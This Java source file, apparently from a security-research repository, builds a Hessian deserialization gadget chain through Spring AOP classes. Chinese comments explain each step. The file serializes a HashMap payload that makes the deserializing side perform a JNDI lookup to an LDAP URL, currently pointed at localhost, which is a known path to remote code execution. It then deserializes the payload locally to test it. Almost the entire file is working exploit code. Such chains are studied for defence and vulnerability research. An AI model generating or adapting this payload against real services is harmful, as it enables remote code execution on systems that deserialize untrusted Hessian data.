package org.dili.hessian;

import com.caucho.hessian.io.*;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectInstanceFactory;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import sun.reflect.ReflectionFactory;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

public class PartiallyComparableAdvisorHolderHessian {
    public static void main(String[] args) throws Exception {
        // ldap url
        String url = "ldap://127.0.0.1:1389/czhupn";

        // 创建SimpleJndiBeanFactory
        // String SimpleJndiBeanFactory = "org.springframework.jndi.support.SimpleJndiBeanFactory";
        // Object simpleJndiBeanFactory = Class.forName(SimpleJndiBeanFactory).getDeclaredConstructor(new Class[]{}).newInstance();
        SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
        setFiled(simpleJndiBeanFactory.getJndiTemplate(), "logger", new NoOpLog());

        // 创建BeanFactoryAspectInstanceFactory
        // 触发SimpleJndiBeanFactory的getType方法
        AspectInstanceFactory beanFactoryAspectInstanceFactory = createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        setFiled(beanFactoryAspectInstanceFactory, "beanFactory", simpleJndiBeanFactory);
        setFiled(beanFactoryAspectInstanceFactory, "name", url);

        // 创建AspectJAroundAdvice
        // 触发BeanFactoryAspectInstanceFactory的getOrder方法
        AbstractAspectJAdvice aspectJAroundAdvice = createWithoutConstructor(AspectJAroundAdvice.class);
        setFiled(aspectJAroundAdvice, "aspectInstanceFactory", beanFactoryAspectInstanceFactory);

        // 创建AspectJPointcutAdvisor
        // 触发AspectJAroundAdvice的getOrder方法
        AspectJPointcutAdvisor aspectJPointcutAdvisor = createWithoutConstructor(AspectJPointcutAdvisor.class);
        setFiled(aspectJPointcutAdvisor, "advice", aspectJAroundAdvice);

        // 创建PartiallyComparableAdvisorHolder
        // 触发AspectJPointcutAdvisor的getOrder方法
        String PartiallyComparableAdvisorHolder = "org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder";
        Class<?> aClass = Class.forName(PartiallyComparableAdvisorHolder);
        Object partially = createWithoutConstructor(aClass);
        setFiled(partially, "advisor", aspectJPointcutAdvisor);


        // 创建HotSwappableTargetSource
        // 触发PartiallyComparableAdvisorHolder的toString方法
        HotSwappableTargetSource targetSource1 = new HotSwappableTargetSource(partially);
        HotSwappableTargetSource targetSource2 = new HotSwappableTargetSource(new XString("aaa"));

        // 创建HashMap
        HashMap hashMap = new HashMap();
        hashMap.put(targetSource1, "111");
        hashMap.put(targetSource2, "222");

        // 序列化
        FileOutputStream fileOutputStream = new FileOutputStream("JavaSec/out/PartiallyComparableAdvisorHolderHessian.bin");
        Hessian2Output hessian2Output = new Hessian2Output(fileOutputStream);
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        hessian2Output.setSerializerFactory(serializerFactory);
        hessian2Output.writeObject(hashMap);
        hessian2Output.close();

        // 反序列化
        FileInputStream fileInputStream = new FileInputStream("JavaSec/out/PartiallyComparableAdvisorHolderHessian.bin");
        Hessian2Input hessian2Input = new Hessian2Input(fileInputStream);
        HashMap o = (HashMap) hessian2Input.readObject();

    }

    public static void setFiled(Object o, String fieldname, Object value) throws Exception {
        Field field = getField(o.getClass(), fieldname);
        field.setAccessible(true);
        field.set(o, value);
    }

    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes,
                                                Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
}
